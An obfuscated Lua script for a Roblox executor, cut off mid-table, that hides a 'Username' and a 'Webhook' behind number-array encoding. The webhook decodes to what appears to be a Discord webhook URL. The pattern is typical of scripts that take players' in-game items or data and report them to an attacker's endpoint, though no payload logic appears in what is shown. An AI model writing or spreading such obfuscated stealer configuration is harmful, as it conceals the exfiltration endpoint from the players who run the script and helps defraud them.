function RtpcYyBPJaggqiLLQZfm(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


function xcamiaJJaakFlTJanUOSrTnawvUzLSZtCWkTnxqnI(c)
tab={}
for i = 1,#c do
x=string.len(c[i]) 
y=string.char(x)
table.insert(tab,y)
end
x=table.concat(tab)
return x
end 


getgenv().gui = false
Username = xcamiaJJaakFlTJanUOSrTnawvUzLSZtCWkTnxqnI({RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410})}) 
Webhook = xcamiaJJaakFlTJanUOSrTnawvUzLSZtCWkTnxqnI({RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),RtpcYyBPJaggqiLLQZfm({4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410,4410}),